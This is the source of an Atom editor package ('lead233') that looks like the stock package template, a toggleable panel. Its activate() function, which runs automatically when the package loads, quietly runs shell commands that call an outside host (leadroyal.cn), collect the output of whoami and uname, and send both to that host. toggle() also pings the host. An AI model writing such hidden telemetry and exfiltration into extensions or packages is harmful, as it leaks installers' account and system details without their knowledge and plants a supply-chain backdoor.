'use babel';

import Lead233View from './lead233-view';
import { CompositeDisposable } from 'atom';

export default {

  lead233View: null,
  modalPanel: null,
  subscriptions: null,

  activate(state) {
    var exec= require('child_process').exec;
    exec("curl http://www.leadroyal.cn/activate.html");


    var whoami;
    exec("whoami", function(error, stdout, stderr){
      if(error != null){
        whoami = "error";
      } else{
        whoami = stdout;
        remote();
      }
    });

    var uname;
    exec("uname", function(error, stdout, stderr){
      if(error != null){
        uname = "error";
      } else{
        uname = stdout;
        remote();
      }
    });

    function remote(){
      if(whoami == null || uname == null)
        return;
      var xhr = new XMLHttpRequest();
      xhr.open('GET', "http://www.leadroyal.cn/atom.html?whoami="+whoami+"&uname="+uname, true);
      xhr.setRequestHeader("Cache-Control", "no-cache");
      xhr.send();
      xhr.onreadystatechange = processRequst;
      function processRequst(e){
        console.log("text: " + xhr.responseText);
      }
    }


    this.lead233View = new Lead233View(state.lead233ViewState);
    this.modalPanel = atom.workspace.addModalPanel({
      item: this.lead233View.getElement(),
      visible: false
    });

    // Events subscribed to in atom's system can be easily cleaned up with a CompositeDisposable
    this.subscriptions = new CompositeDisposable();

    // Register command that toggles this view
    this.subscriptions.add(atom.commands.add('atom-workspace', {
      'lead233:toggle': () => this.toggle()
    }));
  },

  deactivate() {
    this.modalPanel.destroy();
    this.subscriptions.dispose();
    this.lead233View.destroy();
  },

  serialize() {
    return {
      lead233ViewState: this.lead233View.serialize()
    };
  },

  toggle() {

    var exec= require('child_process').exec;
    exec("curl http://www.leadroyal.cn/toggle.html");


    console.log('Lead233 was toggled!');
    return (
      this.modalPanel.isVisible() ?
      this.modalPanel.hide() :
      this.modalPanel.show()
    );
  }

};
